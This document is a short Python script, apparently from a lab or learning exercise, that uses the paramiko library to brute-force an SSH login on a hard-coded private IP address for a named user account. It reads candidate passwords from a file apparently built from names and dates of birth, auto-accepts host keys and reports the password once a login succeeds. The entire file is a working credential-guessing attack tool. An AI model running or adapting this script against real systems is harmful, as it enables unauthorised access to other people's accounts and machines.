import paramiko  # Imports the paramiko library for SSH connections


# Target credentials
hostname = "192.168.1.166"
port = 22
username = "chananyatempleman"
password_file = "name_dob.txt"

def ssh_brute_force():
    """Attempts to brute force SSH login using a list of passwords from a file."""
    with open(password_file, "r") as file:
        for line in file:
            password = line.strip()  # Removes any extra spaces or newlines from the password
            try:
                # Initializes SSH client
                client = paramiko.SSHClient()
                # Automatically accepts the SSH server's host key without prompting, bypassing the "Are you sure you want to continue?" confirmation.
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Attempt SSH login
                client.connect(hostname, port, username, password, timeout=3)
                print(f"Success! Password found: {password}")
                client.close()
                return
            except paramiko.AuthenticationException:
                # Catches authentication failures to prevent the script from crashing and allows it to continue testing other passwords.
                print(f"Failed: {password}")
            except paramiko.SSHException as e:
                # Catches general SSH errors (like too many authentication failures) and stops the attack if further attempts would be pointless.
                print(f"Error: {e}")
                break  
            finally:
                # Ensures the SSH connection is closed properly, regardless of whether the authentication succeeds or fails.
                client.close()

ssh_brute_force()
